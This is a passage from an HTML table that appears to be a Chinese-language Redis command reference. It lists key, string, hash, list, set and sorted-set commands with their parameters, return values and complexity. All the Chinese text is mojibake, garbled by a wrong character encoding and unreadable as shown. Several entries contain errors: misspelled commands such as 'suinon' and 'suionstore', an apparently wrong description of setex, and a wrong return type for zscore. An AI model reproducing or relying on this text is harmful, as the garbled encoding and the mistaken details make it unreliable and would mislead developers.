¼çš„é€šé…ç¬¦</td><td></td><td>æŸ¥çœ‹æ‰€æœ‰é”®</td><td>$O(n)$</td><td>å¤§é‡é”®æ—¶ç¦æ­¢ä½¿ç”¨</td></tr><tr><td><code>dbsize</code></td><td></td><td>intï¼ˆ&gt;=0ï¼‰</td><td>é”®æ€»æ•°</td><td>$O(1)$</td><td>ä¸éå†é”®ï¼Œç›´æ¥è¯»å–å†…ç½®é”®æ€»æ•°</td></tr><tr><td><code>exists key</code></td><td></td><td>intboolï¼ˆå­˜åœ¨ä¸º 1ï¼Œå¦åˆ™ä¸º 0ï¼‰</td><td>æ£€æŸ¥é”®æ˜¯å¦å­˜åœ¨</td><td></td><td></td></tr><tr><td><code>del key [key ...]</code></td><td></td><td>intï¼ˆæˆåŠŸåˆ é™¤çš„ä¸ªæ•°ï¼Œè‹¥åˆ é™¤ä¸å­˜åœ¨çš„é”®ï¼Œè¿”å› 0ï¼‰</td><td>åˆ é™¤é”®</td><td>$O(k)$ï¼Œğ‘˜ä¸ºé”®çš„ä¸ªæ•°</td><td></td></tr><tr><td><code>expire key seconds</code><br><br><code>expireat key timestamp</code><br><br><code>pexpire key milliseconds</code><br><br><code>pexpireat key milliseconds-timestamp</code></td><td></td><td>boolintï¼ˆæˆåŠŸä¸º 1ï¼Œkey ä¸å­˜åœ¨æˆ–æ— æ³•è®¾ç½®ä¸º 0ï¼‰</td><td>é”®è¿‡æœŸ</td><td></td><td>1. æ— è®ºä½¿ç”¨å“ªç§å½¢å¼ï¼Œåœ¨ Redis å†…éƒ¨æœ€ç»ˆä½¿ç”¨çš„éƒ½æ˜¯<code>pexpireat</code>ï¼›<br>2. å¦‚æœ<code>expire key</code>çš„é”®ä¸å­˜åœ¨ï¼Œè¿”å› 0;<br>3. å¦‚æœè¿‡æœŸæ—¶é—´ä¸ºè´Ÿå€¼ï¼Œé”®ä¼šè¢«ç«‹å³åˆ é™¤ï¼ŒçŠ¹å¦‚ä½¿ç”¨äº†<code>del</code>;<br>4. <code>persist key</code>å¯ä»¥å°†é”®çš„è¿‡æœŸæ—¶é—´æ¸…é™¤ï¼›<br>5. <strong>å¯¹äºå­—ç¬¦ä¸²ç±»å‹é”®ï¼Œæ‰§è¡Œ<code>set</code>å‘½ä»¤ä¼šå»æ‰è¿‡æœŸæ—¶é—´</strong>;<br>6. Redis ä¸æ”¯æŒäºŒçº§æ•°æ®ç»“æ„ï¼ˆå“ˆå¸Œã€åˆ—è¡¨ï¼‰å†…éƒ¨å…ƒç´ çš„è¿‡æœŸåŠŸèƒ½ï¼Œå¦‚ä¸èƒ½å¯¹åˆ—è¡¨ç±»å‹çš„ä¸€ä¸ªå…ƒç´ åšè¿‡æœŸæ—¶é—´è®¾ç½®ï¼›<br>7. <code>setex</code>ä½œä¸º<code>set</code>+<code>expire</code>çš„ç»„åˆï¼Œä¸ä½†æ˜¯åŸå­æ‰§è¡Œï¼ŒåŒæ—¶å‡å°‘äº†ä¸€æ¬¡ç½‘ç»œé€šè®¯çš„æ—¶é—´</td></tr><tr><td><code>ttl key</code><br><code>pttl key</code></td><td></td><td>intï¼ˆ&gt;=0ï¼šé”®å‰©ä½™è¿‡æœŸæ—¶é—´ï¼›-1ï¼šé”®æœªè®¾ç½®è¿‡æœŸæ—¶é—´ï¼›-2ï¼šé”®ä¸å­˜åœ¨ï¼‰</td><td>æŸ¥çœ‹é”®å‰©ä½™å­˜æ´»æ—¶é—´ï¼ˆç§’/æ¯«ç§’ï¼‰</td><td></td><td></td></tr><tr><td><code>type key</code></td><td></td><td>é”®å­˜åœ¨è¿”å›æ•°æ®ç±»å‹ï¼Œä¸å­˜åœ¨è¿”å› none</td><td>æŸ¥çœ‹é”®çš„æ•°æ®ç±»å‹</td><td></td><td></td></tr><tr><td><code>rename key newkey</code><br><code>renamenx key newkey</code></td><td></td><td>æˆåŠŸè¿”å›<code>OK</code>,å¤±è´¥ä¸º 0</td><td>é”®é‡å‘½å</td><td></td><td>1. å¦‚æœåœ¨é‡å‘½åä¹‹å‰ï¼Œé”®å€¼å·²ç»å­˜åœ¨ï¼Œåˆ™å€¼ä¼šè¢«è¦†ç›–ï¼›<br>2. ç”±äºé‡å‘½åé”®æœŸé—´ä¼šæ‰§è¡Œ<code>del</code>åˆ é™¤æ—§é”®ï¼Œå¦‚æœé”®å¯¹åº”çš„å€¼è¾ƒå¤§ï¼Œå¯èƒ½ä¼šè¢«é˜»å¡</td></tr><tr><td><code>randomkey</code></td><td></td><td></td><td>éšæœºè¿”å›ä¸€ä¸ªé”®</td><td></td><td></td></tr><tr><td><code>move key db</code><br><br><code>dump key</code> + <code>restore key ttl value</code><br><br><code>migrate host port key|&quot;&quot; destination-db timeout [copy] [replace] [keys key [key ...]]</code></td><td><code>ttl</code>ä¸º 0 æ—¶è¡¨ç¤ºæ— è¿‡æœŸæ—¶é—´<br><code>host</code>:ç›®æ ‡ä¸»æœº<br><code>port</code>:ç›®æ ‡ç«¯å£<br><code>key|&quot;&quot;</code>:è¿ç§»å•ä¸ªé”®æŒ‡å®šé”®åï¼Œå¤šä¸ªé”®åˆ™ä¸ºç©ºå­—ç¬¦ä¸²<br><code>destination-db</code>:ç›®æ ‡ db ç´¢å¼•<br><code>timeout</code>:è¿ç§»çš„è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰<br><code>copy</code>:ä¸åˆ é™¤æºé”®<br><code>replace</code>:å¯¹ç›®æ ‡ Redis è¦†å†™æ“ä½œã€‚è‹¥æœªæŒ‡å®šï¼Œæº Redis å’Œç›®æ ‡ Redis å­˜åœ¨åŒåé”®ä¼šæŠ¥é”™<br><code>keys key [key ...]</code>:è¿ç§»çš„é”®å</td><td></td><td>è¿ç§»é”®</td><td></td><td>æ–¹å¼äºŒä¸­ï¼Œ<code>dump</code>ä¼šå°†é”®å€¼åºåˆ—åŒ–ï¼Œæ ¼å¼é‡‡ç”¨ RDB æ ¼å¼ï¼Œåœ¨ç›®æ ‡ Redis ä¸Šï¼Œ<code>restore</code>å†å°†åºåˆ—åŒ–çš„å€¼å¤åŸ<br><br><code>migrate</code>å®è´¨ä¸Šæ˜¯<code>dump</code>ã€<code>restore</code>ã€<code>del</code>ä¸‰ä¸ªå‘½ä»¤çš„ç»„åˆã€‚<code>migrate</code>å…·æœ‰åŸå­æ€§ï¼Œåªéœ€åœ¨æº Redis ä¸Šæ‰§è¡Œå³å¯ï¼Œç›®æ ‡ Redis å®Œæˆ<code>restore</code>åè¿”å› OKï¼Œæº Redis å†æ ¹æ®<code>migrate</code>çš„å¯¹åº”é€‰é¡¹å†³å®šæ˜¯å¦åœ¨æº Redis ä¸Šåˆ é™¤å¯¹åº”çš„é”®</td></tr><tr><td><code>scan cursor [match pattern] [count number]</code></td><td><code>cursor</code>ï¼šæ¸¸æ ‡ï¼Œç¬¬ä¸€æ¬¡éå†ä»0å¼€å§‹ï¼Œæ¯æ¬¡<code>scan</code>éå†å®Œéƒ½ä¼šè¿”å›å½“å‰æ¸¸æ ‡çš„å€¼ï¼Œç›´åˆ°æ¸¸æ ‡å€¼ä¸º0ï¼Œè¡¨ç¤ºéå†ç»“æŸ<br><code>Â·match pattern</code>ï¼šæ¨¡å¼åŒ¹é…<br><code>count number</code>ï¼šæ˜æ¯æ¬¡è¦éå†çš„é”®ä¸ªæ•°ï¼Œé»˜è®¤å€¼æ˜¯10ï¼Œæ­¤å‚æ•°å¯ä»¥é€‚å½“å¢å¤§</td><td></td><td>æ¸è¿›å¼éå†</td><td></td><td>å¦‚æœåœ¨éå†è¿‡ç¨‹ä¸­é”®å‘ç”Ÿäº†å˜åŒ–ï¼Œåˆ™ç»“æœå¯èƒ½æ˜¯ä¸å‡†ç¡®çš„ï¼›<br><code>hscan</code> è§£å†³ <code>hgetall</code> çš„é˜»å¡<br><code>sscan</code>è§£å†³<code>smembers</code> çš„é˜»å¡<br><code>zscan</code>è§£å†³<code>zrange</code> çš„é˜»å¡</td></tr><tr><td><code>select dbIndex</code></td><td></td><td></td><td>åˆ‡æ¢æ•°æ®åº“</td><td></td><td>é»˜è®¤ 16 ä¸ªæ•°æ®åº“(0~15)ï¼ŒæœªæŒ‡å®šæ•°æ®åº“æ—¶ï¼Œé»˜è®¤ä¸º 0 æ•°æ®åº“;<br>å»ºè®®åªä½¿ç”¨ 0 å·æ•°æ®åº“ï¼Œé¿å…å¤šæ•°æ®åº“çš„åˆ‡æ¢é”™è¯¯ï¼Œä»¥åŠæ•…éšœæ’æŸ¥å›°éš¾ã€‚å¦‚æœéœ€è¦ä½¿ç”¨å¤šæ•°æ®åº“ï¼Œå¯ä»¥åœ¨å•æœºéƒ¨ç½²å¤šä¸ª Redis å®ä¾‹ï¼Œé€šè¿‡ç«¯å£åŒºåˆ†ä¸åŒæ•°æ®åº“</td></tr><tr><td><code>flushdb</code><br><code>flushall</code></td><td></td><td></td><td>æ¸…ç©ºå½“å‰/æ‰€æœ‰æ•°æ®åº“</td><td></td><td>è‹¥æ•°æ®åº“é”®å€¼è¾ƒå¤šï¼Œå¯èƒ½å¼•å‘é˜»å¡</td></tr><tr><td><strong>å­—ç¬¦ä¸² String</strong></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><code>set key value [ex seconds] [px milliseconds] [nx|xx]</code></td><td>exï¼šè®¾ç½®ç§’çº§è¿‡æœŸæ—¶é—´<br>pxï¼šè®¾ç½®æ¯«ç§’çº§è¿‡æœŸæ—¶é—´<br>nxï¼šé”®ä¸å­˜åœ¨æ‰èƒ½è®¾ç½®æˆåŠŸï¼Œç”¨äºæ·»åŠ <br>xxï¼šé”®å­˜åœ¨æ‰èƒ½è®¾ç½®æˆåŠŸï¼Œç”¨äºæ›´æ–°</td><td>æˆåŠŸè¿”å› OKï¼Œå¤±è´¥è¿”å› 0</td><td>è®¾ç½®å€¼</td><td>$O(1)$</td><td></td></tr><tr><td><code>setex key seconds value</code></td><td></td><td>æˆåŠŸè¿”å› OKï¼Œå¤±è´¥è¿”å› 0</td><td>è®¾å®šçš„å€¼å­˜åœ¨æ‰ä¼šæˆåŠŸ</td><td></td><td></td></tr><tr><td><code>setnx key value</code></td><td></td><td>æˆåŠŸè¿”å› OKï¼Œå¤±è´¥è¿”å› 0</td><td>è®¾å®šçš„å€¼ä¸å­˜åœ¨æ‰ä¼šæˆåŠŸ</td><td></td><td>å¸¸ç”¨äºåˆ†å¸ƒå¼é”</td></tr><tr><td><code>get key</code></td><td></td><td>é”®å­˜åœ¨æ—¶è¿”å›å€¼ï¼Œä¸å­˜åœ¨è¿”å› nil</td><td>è·å–å€¼</td><td>$O(1)$</td><td></td></tr><tr><td><code>mset key value [key value ...]</code></td><td></td><td>æˆåŠŸè¿”å› OKï¼Œå¤±è´¥è¿”å› 0</td><td>æ‰¹é‡è®¾ç½®å€¼</td><td>$O(k)$ï¼Œğ‘˜ä¸ºé”®çš„ä¸ªæ•°</td><td></td></tr><tr><td><code>mget key [key ...]</code></td><td></td><td>é”®å­˜åœ¨æ—¶è¿”å›å€¼ï¼Œä¸å­˜åœ¨è¿”å› nilã€‚ç»“æœæŒ‰ç…§ä¼ å…¥é”®çš„é¡ºåºè¿”å›</td><td>æ‰¹é‡è·å–å€¼</td><td>$O(k)$ï¼Œğ‘˜ä¸ºé”®çš„ä¸ªæ•°</td><td></td></tr><tr><td><code>incr key</code></td><td></td><td>å€¼ä¸æ˜¯æ•´æ•°ï¼Œè¿”å›é”™è¯¯<br>å€¼æ˜¯æ•´æ•°ï¼Œè¿”å›è‡ªå¢åç»“æœ<br>é”®ä¸å­˜åœ¨ï¼ŒæŒ‰ç…§å€¼ä¸º 0 è‡ªå¢ï¼Œè¿”å›ç»“æœä¸º 1</td><td>å€¼è‡ªå¢</td><td>$O(1)$</td><td></td></tr><tr><td><code>decr key</code></td><td></td><td>int</td><td>å€¼è‡ªå‡</td><td>$O(1)$</td><td></td></tr><tr><td><code>incrby key increment</code></td><td></td><td>int</td><td>è‡ªå¢æŒ‡å®šæ•°å­—</td><td>$O(1)$</td><td></td></tr><tr><td><code>decrby key decrement</code></td><td></td><td>int</td><td>è‡ªå‡æŒ‡å®šæ•°å­—</td><td>$O(1)$</td><td></td></tr><tr><td><code>incrbyfloat key increment</code></td><td></td><td>float</td><td>è‡ªå¢æµ®ç‚¹æ•°</td><td>$O(1)$</td><td></td></tr><tr><td><code>append key value</code></td><td></td><td>intï¼ˆè¿”å›è¿½åŠ åçš„å­—ç¬¦é•¿åº¦ï¼‰</td><td>å‘å­—ç¬¦ä¸²å°¾éƒ¨è¿½åŠ å€¼</td><td>$O(1)$</td><td></td></tr><tr><td><code>strlen key</code></td><td></td><td>intï¼ˆæ ¹æ®ä¸åŒç¼–ç è¿”å›å­—ç¬¦é•¿åº¦ï¼Œå¦‚ UTF8 çš„â€œä¸­å›½â€è¿”å›å€¼ä¸º 6ï¼‰</td><td>å­—ç¬¦ä¸²é•¿åº¦</td><td>$O(1)$</td><td></td></tr><tr><td><code>getset key value</code></td><td></td><td></td><td>è®¾ç½®å¹¶è¿”å›å€¼</td><td></td><td></td></tr><tr><td><code>setrange key offeset value</code></td><td></td><td>intï¼ˆè¿”å›å­—ç¬¦é•¿åº¦ï¼‰</td><td>è®¾ç½®æŒ‡å®šä½ç½®çš„å­—ç¬¦</td><td>$O(1)$</td><td></td></tr><tr><td><code>getrange key start end</code></td><td></td><td>è¿”å›æˆªå–çš„å­—ç¬¦å†…å®¹</td><td>è·å–éƒ¨åˆ†å­—ç¬¦ä¸²</td><td>$O(n)$ï¼Œğ‘› ä¸ºå­—ç¬¦ä¸²é•¿åº¦ï¼Œç”±äºè·å–å­—ç¬¦ä¸²éå¸¸å¿«ï¼Œè‹¥å­—ç¬¦ä¸²ä¸æ˜¯å¾ˆé•¿ï¼Œå¯ä»¥è§†ä¸º$O(1)$</td><td></td></tr><tr><td><strong>å“ˆå¸Œ Hash</strong></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><code>hset key field value</code><br><code>hget key field</code></td><td></td><td></td><td>è®¾ç½®å€¼<br>è·å–å€¼</td><td>$O(1)$<br>$O(1)$</td><td>åœ¨ Redis ä¸­ï¼Œå“ˆå¸Œç±»å‹æ˜¯æŒ‡é”®å€¼æœ¬èº«åˆæ˜¯ä¸€ä¸ªé”®å€¼å¯¹ç»“æ„ï¼ˆå½¢å¦‚ JSONï¼‰ã€‚å“ˆå¸Œç±»å‹ä¸­çš„æ˜ å°„å…³ç³»å«ä½œfield-valueï¼Œæ³¨æ„è¿™é‡Œçš„valueæ˜¯æŒ‡fieldå¯¹åº”çš„å€¼ï¼Œä¸æ˜¯é”®å¯¹åº”çš„å€¼ï¼Œè¯·æ³¨æ„valueåœ¨ä¸åŒä¸Šä¸‹æ–‡çš„ä½œç”¨ã€‚</td></tr><tr><td><code>hdel key field [field ...]</code></td><td></td><td>int ï¼ˆæˆåŠŸä¸ºåˆ é™¤çš„ä¸ªæ•°ï¼‰</td><td>åˆ é™¤ field</td><td>$O(k)$ ï¼Œğ‘˜æ˜¯fieldä¸ªæ•°</td><td></td></tr><tr><td><code>hlen key</code></td><td></td><td>int</td><td>è®¡ç®— field ä¸ªæ•°</td><td>$O(1)$</td><td></td></tr><tr><td><code>hmset key field value [field value ...]</code><br><code>hmget key field [field ...]</code></td><td></td><td></td><td>æ‰¹é‡è®¾ç½®æˆ–è·å–field-value</td><td>$O(k)$ ï¼Œğ‘˜æ˜¯fieldä¸ªæ•°<br>$O(k)$ ï¼Œğ‘˜æ˜¯fieldä¸ªæ•°</td><td></td></tr><tr><td><code>hexists key field</code></td><td></td><td>å­˜åœ¨ä¸º 1ï¼Œå¦åˆ™ä¸º 0</td><td>åˆ¤æ–­fieldæ˜¯å¦å­˜åœ¨</td><td>$O(1)$</td><td></td></tr><tr><td><code>hsetnx key field value</code></td><td></td><td></td><td></td><td>$O(1)$</td><td></td></tr><tr><td><code>hkeys key</code></td><td></td><td></td><td>è·å–æ‰€æœ‰field</td><td>$O(n)$ ï¼Œğ‘› æ˜¯fieldä¸ªæ•°</td><td><code>hkeys</code> å« <code>hfields</code>æ›´æ°å½“</td></tr><tr><td><code>hvals key</code></td><td></td><td></td><td>è·å–æ‰€æœ‰value</td><td>$O(n)$ ï¼Œğ‘› æ˜¯fieldä¸ªæ•°</td><td></td></tr><tr><td><code>hgetall key</code></td><td></td><td></td><td>è·å–æ‰€æœ‰çš„field-value</td><td>$O(n)$ ï¼Œğ‘› æ˜¯fieldä¸ªæ•°</td><td>åœ¨ä½¿ç”¨<code>hgetall</code>æ—¶ï¼Œå¦‚æœå“ˆå¸Œå…ƒç´ ä¸ªæ•°æ¯”è¾ƒå¤šï¼Œå¯èƒ½ä¼šé˜»å¡Redisã€‚å¦‚æœå¼€å‘äººå‘˜åªéœ€è¦è·å–éƒ¨åˆ†fieldï¼Œå¯ä»¥ä½¿ç”¨<code>hmget</code>ï¼Œå¦‚æœä¸€å®šè¦è·å–å…¨éƒ¨field-valueï¼Œå¯ä»¥ä½¿ç”¨<code>hscan</code>å‘½ä»¤ï¼Œè¯¥å‘½ä»¤ä¼šæ¸è¿›å¼éå†å“ˆå¸Œç±»å‹ã€‚</td></tr><tr><td><code>hincrby key field</code><br><code>hincrbyfloat key field</code></td><td></td><td></td><td>æŒ‰æŒ‡å®šå€¼é€’å¢</td><td>$O(1)$<br>$O(1)$</td><td></td></tr><tr><td><code>hstrlen key field</code></td><td></td><td></td><td>è®¡ç®—valueçš„å­—ç¬¦ä¸²é•¿åº¦</td><td>$O(1)$</td><td></td></tr><tr><td>åˆ—è¡¨ List</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><code>lpush key value [value ...]</code><br><code>rpush key value [value ...]</code></td><td></td><td>intï¼ˆæˆåŠŸæ’å…¥å…ƒç´ ä¸ªæ•°ï¼‰</td><td>ä»å·¦/å³ä¾§æ’å…¥å…ƒç´ </td><td>$O(k)$ï¼Œğ‘˜ ä¸ºå…ƒç´ ä¸ªæ•°</td><td>åˆ—è¡¨ç±»å‹çš„ä¸¤ä¸ªç‰¹ç‚¹ï¼šç¬¬ä¸€ï¼Œåˆ—è¡¨ä¸­çš„å…ƒç´ æ˜¯æœ‰åºçš„ï¼ˆå³ï¼Œå¯ä»¥é€šè¿‡ç´¢å¼•ä¸‹æ ‡è·å–å…ƒç´ ï¼‰ï¼›ç¬¬äºŒï¼Œåˆ—è¡¨ä¸­çš„å…ƒç´ å¯ä»¥æ˜¯é‡å¤çš„</td></tr><tr><td><code>lpop key</code><br><code>rpop key</code></td><td></td><td></td><td>ä»åˆ—è¡¨å·¦/å³ä¾§å¼¹å‡ºå…ƒç´ </td><td>$O(1)$</td><td></td></tr><tr><td><code>linsert key before|after pivot value</code></td><td></td><td>intï¼ˆè¿”å›å½“å‰åˆ—è¡¨é•¿åº¦ï¼‰</td><td>å‘æŸä¸ªå…ƒç´ å‰æˆ–è€…åæ’å…¥å…ƒç´ </td><td>$O(n)$ï¼Œğ‘› æ˜¯ pivot è·ç¦»åˆ—è¡¨å¤´æˆ–å°¾çš„è·ç¦»</td><td></td></tr><tr><td><code>lrange key start end</code></td><td></td><td></td><td>è·å–æŒ‡å®šèŒƒå›´å†…çš„å…ƒç´ åˆ—è¡¨</td><td>$O(s+n)$ï¼Œğ‘  æ˜¯ start åç§»é‡ï¼Œğ‘› æ˜¯start åˆ° end çš„èŒƒå›´</td><td>1. <code>lrange 0 -1</code> å¯è·å–åˆ—è¡¨æ‰€æœ‰å…ƒç´ <br>2. end åŒ…å«äº†è‡ªèº«</td></tr><tr><td><code>lindex key index</code></td><td></td><td></td><td>è·å–åˆ—è¡¨æŒ‡å®šç´¢å¼•ä¸‹æ ‡çš„å…ƒç´ </td><td>$O(n)$ï¼Œğ‘› æ˜¯ç´¢å¼•çš„åç§»é‡</td><td></td></tr><tr><td><code>llen key</code></td><td></td><td>int</td><td>è·å–åˆ—è¡¨é•¿åº¦</td><td>$O(1)$</td><td></td></tr><tr><td><code>lrem key count value</code></td><td></td><td>count &gt; 0ï¼Œä»å·¦åˆ°å³ï¼Œåˆ é™¤æœ€å¤š count ä¸ªå…ƒç´ <br>count &lt; 0ï¼Œä»å³åˆ°å·¦ï¼Œåˆ é™¤æœ€å¤š count ç»å¯¹å€¼ä¸ªå…ƒç´ <br>count = 0ï¼Œåˆ é™¤æ‰€æœ‰</td><td>åˆ é™¤æŒ‡å®šå…ƒç´ </td><td>$O(n)$ï¼Œğ‘› æ˜¯åˆ—è¡¨é•¿åº¦</td><td></td></tr><tr><td><code>ltrim key start end</code></td><td></td><td></td><td>æŒ‰ç…§ç´¢å¼•èŒƒå›´ä¿®å‰ªåˆ—è¡¨</td><td>$O(n)$ï¼Œğ‘› æ˜¯è¦è£å‰ªçš„å…ƒç´ æ€»æ•°</td><td></td></tr><tr><td><code>lset key index newValue</code></td><td></td><td></td><td>ä¿®æ”¹æŒ‡å®šç´¢å¼•ä¸‹æ ‡çš„å…ƒç´ </td><td>$O(n)$ï¼Œğ‘› æ˜¯ç´¢å¼•çš„åç§»é‡</td><td></td></tr><tr><td><code>blpop key [key ...] timeout</code><br><code>brpop key [key ...] timeout</code></td><td><code>timeout</code> ä¸ºé˜»å¡æ—¶é—´</td><td></td><td>é˜»å¡å¼å¼¹å‡º</td><td>$O(1)$</td><td>å¦‚æœæœ‰å¤šä¸ªé”®ï¼Œé‚£ä¹ˆ<code>brpop</code>ä¼šä»å·¦è‡³å³éå†é”®ï¼Œä¸€æ—¦æœ‰ä¸€ä¸ªé”®èƒ½å¼¹å‡ºå…ƒç´ ï¼Œå®¢æˆ·ç«¯ç«‹å³è¿”å›</td></tr><tr><td><strong>é›†åˆ(Set)</strong></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><code>sadd key element [element ...]</code></td><td></td><td>intï¼ˆè¿”å›æ·»åŠ æˆåŠŸå…ƒç´ çš„ä¸ªæ•°ï¼‰</td><td>æ·»åŠ å…ƒç´ </td><td>$O(k)$ï¼Œğ‘˜æ˜¯å…ƒç´ ä¸ªæ•°</td><td></td></tr><tr><td><code>srem key element [element ...]</code></td><td></td><td>intï¼ˆè¿”å›åˆ é™¤æˆåŠŸå…ƒç´ çš„ä¸ªæ•°ï¼‰</td><td>åˆ é™¤å…ƒç´ </td><td>$O(k)$ï¼Œğ‘˜æ˜¯å…ƒç´ ä¸ªæ•°</td><td></td></tr><tr><td><code>scard key</code></td><td></td><td></td><td>è®¡ç®—å…ƒç´ ä¸ªæ•°</td><td>$O(1)$</td><td>åŒ<code>dbsize</code>ç±»ä¼¼ï¼Œç›´æ¥è¯»å–å†…ç½®å˜é‡</td></tr><tr><td><code>sismember key element</code></td><td></td><td>intï¼ˆå­˜åœ¨è¿”å› 1ï¼Œå¦åˆ™ä¸º 0ï¼‰</td><td>åˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­</td><td>$O(1)$</td><td></td></tr><tr><td><code>srandmember key [count]</code></td><td></td><td></td><td>éšæœºä»é›†åˆè¿”å›æŒ‡å®šä¸ªæ•°å…ƒç´ </td><td>$O(count)$</td><td></td></tr><tr><td><code>spop key</code></td><td></td><td></td><td>ä»é›†åˆéšæœºå¼¹å‡ºå…ƒç´ </td><td>$O(1)$</td><td><code>srandmember</code>å’Œ<code>spop</code>éƒ½æ˜¯éšæœºä»é›†åˆé€‰å‡ºå…ƒç´ ï¼Œä¸¤è€…ä¸åŒçš„æ˜¯<code>spop</code>å‘½ä»¤æ‰§è¡Œåï¼Œå…ƒç´ ä¼šä»é›†åˆä¸­åˆ é™¤ï¼Œè€Œ<code>srandmember</code>ä¸ä¼šã€‚</td></tr><tr><td><code>smembers key</code></td><td></td><td></td><td>è·å–æ‰€æœ‰å…ƒç´ ï¼Œç»“æœæ˜¯æ— åºçš„</td><td>$O(n)$ï¼Œğ‘›æ˜¯å…ƒç´ æ€»æ•°</td><td><code>smembers</code>å’Œ<code>lrange</code>ã€<code>hgetall</code>éƒ½å±äºæ¯”è¾ƒé‡çš„å‘½ä»¤ï¼Œå¦‚æœå…ƒç´ è¿‡å¤šå­˜åœ¨é˜»å¡Redisçš„å¯èƒ½æ€§ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨<code>sscan</code>æ¥å®Œæˆ</td></tr><tr><td><code>sinter key [key ...]</code></td><td></td><td></td><td>å–äº¤é›†</td><td>$O(m*k)$ï¼Œğ‘˜æ˜¯å¤šä¸ªé›†åˆå…ƒç´ æœ€å°‘çš„ä¸ªæ•°ï¼Œğ‘šæ˜¯é”®ä¸ªæ•°</td><td></td></tr><tr><td><code>suinon key [key ...]</code></td><td></td><td></td><td>å–å¹¶é›†</td><td>$O(k)$ï¼Œğ‘˜æ˜¯å¤šä¸ªé›†åˆå…ƒç´ ä¸ªæ•°å’Œ</td><td></td></tr><tr><td><code>sdiff key [key ...]</code></td><td></td><td></td><td>å–å·®é›†</td><td>$O(k)$ï¼Œğ‘˜æ˜¯å¤šä¸ªé›†åˆå…ƒç´ ä¸ªæ•°å’Œ</td><td></td></tr><tr><td><code>sinterstore destination key [key ...]</code><br><code>suionstore destination key [key ...]</code><br><code>sdiffstore destination key [key ...]</code></td><td></td><td></td><td>ï¼‰å°†äº¤é›†ã€å¹¶é›†ã€å·®é›†çš„ç»“æœä¿å­˜</td><td></td><td></td></tr><tr><td><strong>æœ‰åºé›†åˆï¼ˆZsetï¼‰</strong></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><code>zadd key score member [score member ...]</code></td><td></td><td></td><td>æ·»åŠ æˆå‘˜</td><td>$O(k*log(n))$ï¼Œğ‘˜æ˜¯æ·»åŠ æˆå‘˜çš„ä¸ªæ•°ï¼Œğ‘›æ˜¯å½“å‰æœ‰åºé›†åˆæˆå‘˜ä¸ªæ•°</td><td></td></tr><tr><td><code>zcard key</code></td><td></td><td>int</td><td>è®¡ç®—æˆå‘˜ä¸ªæ•°</td><td>$O(1)$</td><td></td></tr><tr><td><code>zscore key member</code></td><td></td><td>intï¼ˆæˆå‘˜ä¸å­˜åœ¨è¿”å› nilï¼‰</td><td>è®¡ç®—æŸä¸ªæˆå‘˜çš„åˆ†æ•°</td><td>$O(1)$</td><td></td></tr><tr><td><code>zrank key member</code><br><code>zrevrank key member</code></td><td></td><td>è¿”å›åˆ†æ•°ä»ä½åˆ°é«˜/ä»é«˜åˆ°ä½çš„æ’å</td><td>è®¡ç®—æˆå‘˜çš„æ’å</td><td>$O(log(n))$ï¼Œğ‘›æ˜¯å½“å‰æœ‰åºé›†åˆæˆå‘˜ä¸ªæ•°</td><td></td></tr><tr><td><code>zrem key member [member ...]</code></td><td></td><td>è¿”å›åˆ é™¤æˆå‘˜çš„ä¸ªæ•°</td><td>åˆ é™¤æˆå‘˜</td><td>$O(k*log(n))$ï¼Œğ‘˜æ˜¯åˆ é™¤æˆå‘˜çš„ä¸ªæ•°ï¼Œğ‘›æ˜¯å½“å‰æœ‰åºé›†åˆæˆå‘˜ä¸ªæ•°</td><td></td></tr><tr><td><code>zincrby key increment member</code></td><td></td><td></td><td>å¢åŠ æˆå‘˜çš„åˆ†æ•°</td><td>$O(log(n))$ï¼Œğ‘›æ˜¯å½“å‰æœ‰åºé›†åˆæˆå‘˜ä¸ªæ•°</td><td></td></tr><tr><td><code>zrange key start end [withscores]</code><br><code>zrevrange key start end [withscores]</code></td><td><code>withscores</code>ä¼šåŒæ—¶è¿”å›æˆå‘˜åˆ†æ•°</td><td>è¿”å›åˆ†æ•°ä»ä½åˆ°é«˜/ä»é«˜åˆ°ä½çš„æ’å</td><td>è¿”å›æŒ‡å®šæ’åèŒƒå›´çš„æˆå‘˜</td><td>$O(log(n)+k)$ï¼Œğ‘˜æ˜¯è¦è·å–çš„æˆå‘˜ä¸ªæ•°ï¼Œğ‘›æ˜¯å½“å‰æœ‰åºé›†åˆæˆå‘˜ä¸ªæ•°</td><td></td></tr><tr><td><code>zrangebyscore key min max [withscores] [limit offset count]</code><br><code>zrevrangebyscore key max min [withscores] [limit offset count]</code></td><td><code>min</code>å’Œ<code>max</code>è¿˜æ”¯æŒå¼€åŒºé—´ï¼ˆå°æ‹¬å·ï¼‰å’Œé—­åŒºé—´ï¼ˆä¸­æ‹¬å·ï¼‰ï¼Œ<code>-inf</code>å’Œ<code>+inf</code>åˆ†åˆ«ä»£è¡¨æ— é™å°å’Œæ— é™å¤§</td><td></td><td>è¿”å›æŒ‡å®šåˆ†æ•°èŒƒå›´çš„æˆå‘˜</td><td>$O(log(n)+k)$ï¼Œğ‘˜æ˜¯è¦è·å–çš„æˆå‘˜ä¸ªæ•°ï¼Œğ‘›æ˜¯å½“å‰æœ‰åºé›†åˆæˆå‘˜ä¸ªæ•°</td><td></td></tr><tr><td><code>zcount key min max</code></td><td></td><td></td><td>è¿”å›æŒ‡å®šåˆ†æ•°èŒƒå›´æˆå‘˜ä¸ªæ•°</td><td>$O(log(n))$ï¼Œğ‘›æ˜¯å½“å‰æœ‰åºé›†åˆæˆå‘˜ä¸ªæ•°</td><td></td></tr><tr><td><code>zremrangebyrank key start end</code></td><td></td><td></td><td>åˆ é™¤æŒ‡å®šæ’åå†…çš„å‡åºå…ƒç´ </td><td>$O(log(n)+k)$ï¼Œğ‘˜æ˜¯è¦åˆ é™¤çš„æˆå‘˜ä¸ªæ•°ï¼Œğ‘›æ˜¯å½“å‰æœ‰åºé›†åˆæˆå‘˜ä¸ªæ•°</td><td></td></tr><tr><td><code>zremrangebyscore key min max</code></td><td></td><td></td><td>åˆ é™¤æŒ‡å®šåˆ†æ•°èŒƒå›´çš„æˆå‘˜</td><td>$O(log(n)+k)$ï¼Œğ‘˜æ˜¯è¦åˆ 